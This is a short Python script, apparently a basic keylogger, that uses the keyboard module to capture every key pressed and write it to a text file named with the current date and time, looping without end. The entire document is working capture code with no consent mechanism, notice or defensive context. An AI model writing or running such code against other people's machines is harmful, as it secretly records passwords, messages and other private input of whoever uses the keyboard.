# Importing the keyboard module which will acess the inputs from the keyboard
import keyboard
from datetime import datetime

# Get the current date and time for filename
now = datetime.now()
now = now.strftime("%d-%m-%Y %H-%M-%S")

# Create path
path = now + '.txt'

with open(path, 'w') as file:
    while True:
        key = keyboard.read_event(suppress=False)
        if(key.event_type == 'down'):
            file.write(key.name)
